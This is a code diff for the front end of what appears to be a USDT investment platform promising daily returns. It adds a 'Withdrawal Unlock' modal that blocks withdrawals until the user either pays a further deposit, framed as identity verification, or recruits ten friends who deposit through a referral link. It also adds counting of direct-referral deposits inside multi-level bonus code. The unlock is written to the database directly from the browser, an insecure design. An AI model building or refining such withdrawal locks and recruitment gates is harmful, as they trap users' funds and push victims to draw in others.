@@ -760,11 +760,74 @@ async function claimTaskReward() {
   } catch(e) { showToast('❌ Error: ' + (e.message || 'Try again')); }
 }
 
+var witUnlockOption = 0; // 1=deposit, 2=referral
+var witUnlockFee = 0;
+var witUnlockRefNeeded = 10;
+
 function showIdentityVerification(verifyFee) {
-  const modal = document.getElementById('identity-modal');
-  document.getElementById('identity-msg').innerHTML =
-    'Please add <b style="color:#ffd54f">' + verifyFee + ' USDT</b> to complete identity verification and activate the withdrawal function.';
+  var modal = document.getElementById('identity-modal');
+  var ud = window.userData || {};
+  witUnlockFee = parseFloat(verifyFee) || 0;
+  witUnlockOption = 0;
+
+  // Option 1 text
+  document.getElementById('opt1-amount').textContent = '$' + witUnlockFee.toFixed(2);
+
+  // Option 2: referral progress
+  var refDeposited = parseInt(ud.referral_deposit_count || 0);
+  var needed = Math.max(0, witUnlockRefNeeded - refDeposited);
+  document.getElementById('opt2-needed').textContent = witUnlockRefNeeded;
+  document.getElementById('opt2-progress').textContent = 'Progress: ' + refDeposited + '/' + witUnlockRefNeeded;
+
+  // Reset selection
+  document.getElementById('wit-opt-1').style.border = '2px solid #1e3a1e';
+  document.getElementById('wit-opt-2').style.border = '2px solid #1e3a1e';
+  document.getElementById('wit-selected-info').style.display = 'none';
+
   modal.style.display = 'flex';
+}
+
+function selectWitOption(opt) {
+  witUnlockOption = opt;
+  var ud = window.userData || {};
+  document.getElementById('wit-opt-1').style.border = opt===1 ? '2px solid #00e676' : '2px solid #1e3a1e';
+  document.getElementById('wit-opt-2').style.border = opt===2 ? '2px solid #00e676' : '2px solid #1e3a1e';
+  var infoEl = document.getElementById('wit-selected-info');
+  infoEl.style.display = 'block';
+  if (opt === 1) {
+    infoEl.innerHTML = '💰 You need to deposit <b style="color:#ffd54f">$' + witUnlockFee.toFixed(2) + ' USDT</b> to unlock withdrawal. Go to Deposit page after closing.';
+  } else {
+    var refDeposited = parseInt(ud.referral_deposit_count || 0);
+    var needed = Math.max(0, witUnlockRefNeeded - refDeposited);
+    if (needed <= 0) {
+      infoEl.innerHTML = '✅ You already have <b style="color:#00e676">10 referral deposits</b>! Tap Confirm to unlock.';
+    } else {
+      infoEl.innerHTML = '👥 You need <b style="color:#00e676">' + needed + ' more</b> friends to deposit via your referral link. Share your link!';
+    }
+  }
+}
+
+function confirmWitOption() {
+  if (witUnlockOption === 0) { showToast('❌ Please select an option'); return; }
+  var ud = window.userData || {};
+  if (witUnlockOption === 1) {
+    closeIdentityModal();
+    showToast('💰 Please make a deposit of $' + witUnlockFee.toFixed(2) + ' to unlock withdrawal');
+    setTimeout(() => goPage('deposit'), 1200);
+  } else {
+    var refDeposited = parseInt(ud.referral_deposit_count || 0);
+    if (refDeposited >= witUnlockRefNeeded) {
+      closeIdentityModal();
+      // unlock করা — referral দিয়ে unlock হয়েছে
+      update(ref(db, 'users/' + userId), { deposited_after_withdraw: parseFloat(ud.deposited || 0) });
+      window.userData.deposited_after_withdraw = parseFloat(ud.deposited || 0);
+      showToast('✅ Withdrawal unlocked via referrals!');
+    } else {
+      closeIdentityModal();
+      showToast('👥 Share your referral link to get more deposits!');
+      setTimeout(() => goPage('referral'), 1200);
+    }
+  }
 }
 
 function closeIdentityModal() {
@@ -1769,11 +1832,38 @@ Deposit USDT and start earning daily returns.
 
 <!-- IDENTITY VERIFICATION MODAL -->
 <div id="identity-modal" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:9999;align-items:center;justify-content:center;">
-  <div style="background:#1a1600;border:1px solid #c8960040;border-radius:20px;padding:24px 20px;width:88%;max-width:360px;margin:auto;">
-    <div style="font-size:13px;color:#e8d5a0;line-height:1.7;text-align:center;margin-bottom:20px;" id="identity-msg">
-      Please add <b style="color:#ffd54f">14.94USDT</b> to complete identity verification and activate the withdrawal function.
+  <div style="background:#0d1a0d;border:1px solid #1e4d1e40;border-radius:20px;padding:24px 20px;width:90%;max-width:370px;margin:auto;">
+    <div style="font-size:15px;font-weight:800;color:#00e676;text-align:center;margin-bottom:6px;">🔒 Withdrawal Unlock</div>
+    <div style="font-size:12px;color:#5a8a5a;text-align:center;margin-bottom:18px;">Choose one option to activate your withdrawal</div>
+
+    <!-- Option 1: Deposit -->
+    <div id="wit-opt-1" onclick="selectWitOption(1)" style="background:#111a11;border:2px solid #1e3a1e;border-radius:14px;padding:14px 16px;margin-bottom:10px;cursor:pointer;transition:.2s;">
+      <div style="display:flex;align-items:center;gap:10px;">
+        <div style="width:36px;height:36px;border-radius:50%;background:rgba(0,230,118,.1);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;">💰</div>
+        <div>
+          <div style="font-size:13px;font-weight:700;color:#e8f5e9;margin-bottom:2px;">Re-Deposit</div>
+          <div style="font-size:11px;color:#5a8a5a;line-height:1.5;" id="opt1-desc">Deposit <b style="color:#ffd54f" id="opt1-amount">$0</b> USDT to unlock withdrawal</div>
+        </div>
+      </div>
     </div>
-    <button onclick="closeIdentityModal()" style="width:100%;background:linear-gradient(135deg,#c8960080,#ffd54f);color:#000;font-size:15px;font-weight:700;padding:14px;border-radius:12px;border:none;cursor:pointer;">OK</button>
+
+    <!-- Option 2: Referral -->
+    <div id="wit-opt-2" onclick="selectWitOption(2)" style="background:#111a11;border:2px solid #1e3a1e;border-radius:14px;padding:14px 16px;margin-bottom:18px;cursor:pointer;transition:.2s;">
+      <div style="display:flex;align-items:center;gap:10px;">
+        <div style="width:36px;height:36px;border-radius:50%;background:rgba(0,230,118,.1);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;">👥</div>
+        <div>
+          <div style="font-size:13px;font-weight:700;color:#e8f5e9;margin-bottom:2px;">Referral Unlock</div>
+          <div style="font-size:11px;color:#5a8a5a;line-height:1.5;">Get <b style="color:#00e676" id="opt2-needed">10</b> friends to deposit via your referral link<br><span id="opt2-progress" style="color:#ffd54f;font-size:10px;">Progress: 0/10</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div id="wit-selected-info" style="display:none;background:rgba(0,230,118,.06);border:1px solid rgba(0,230,118,.2);border-radius:10px;padding:10px 14px;margin-bottom:14px;font-size:12px;color:#a5d6a7;text-align:center;"></div>
+
+    <div style="display:flex;gap:8px;">
+      <button onclick="closeIdentityModal()" style="flex:1;background:rgba(255,255,255,.06);color:#5a8a5a;font-size:13px;font-weight:700;padding:12px;border-radius:12px;border:1px solid #1e3a1e;cursor:pointer;">Cancel</button>
+      <button onclick="confirmWitOption()" style="flex:1;background:linear-gradient(135deg,#00c853,#00e676);color:#000;font-size:13px;font-weight:700;padding:12px;border-radius:12px;border:none;cursor:pointer;">Confirm</button>
+    </div>
   </div>
 </div>
 
@@ -2003,10 +2093,15 @@ window.addEventListener('load', function() {
         if (!refSnap.exists()) break;
         const rd = refSnap.val();
         const bonus = amount * bonusRates[level];
-        await update(ref(db, 'users/' + referrerId), {
+        const refUpdate = {
           balance: (rd.balance || 0) + bonus,
           referral_earnings: (rd.referral_earnings || 0) + bonus
-        });
+        };
+        // Level 1 (direct referral) deposit track করা — withdraw unlock এর জন্য
+        if (level === 0) {
+          refUpdate.referral_deposit_count = (rd.referral_deposit_count || 0) + 1;
+        }
+        await update(ref(db, 'users/' + referrerId), refUpdate);
         await push(ref(db, 'transactions/' + referrerId), {
           type: 'referral', amount: bonus, from: userId, from_name: userName,
           level: level + 1, rate: (bonusRates[level] * 100) + '%', status: 'success', time: depKey
